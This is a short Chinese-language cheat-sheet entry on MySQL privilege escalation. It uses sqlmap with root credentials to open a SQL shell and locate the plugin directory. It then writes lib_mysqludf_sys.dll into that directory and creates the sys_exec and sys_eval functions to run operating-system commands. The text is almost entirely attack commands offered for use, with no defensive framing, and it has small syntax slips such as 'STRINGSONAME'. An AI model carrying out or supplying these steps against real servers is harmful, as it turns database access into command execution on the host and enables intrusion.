 
## mysql提权

(1）连接mysql数据打开一个交互shell:
```sql
sqlmap.py -dmysql://root:root@127.0.0.1:3306/test --sql-shell

select @@version;

select @@plugin_dir;

select @@basedir;   //查找mysql的目录

select @@datadir 路径


```
(2）利用sqlmap上传`lib_mysqludf_sys`到MySQL插件目录:

```python
sqlmap.py -d mysql://root:root@127.0.0.1:3306/test 
--file-write=lib_mysqludf_sys.dll
--file-dest=plugin插件地址

CREATE FUNCTION sys_exec RETURNS STRINGSONAME 'lib_mysqludf_sys.dll'

CREATE FUNCTION sys_eval RETURNS STRINGSONAME 'lib_mysqludf_sys.dll'

select sys_eval('ver'); 

```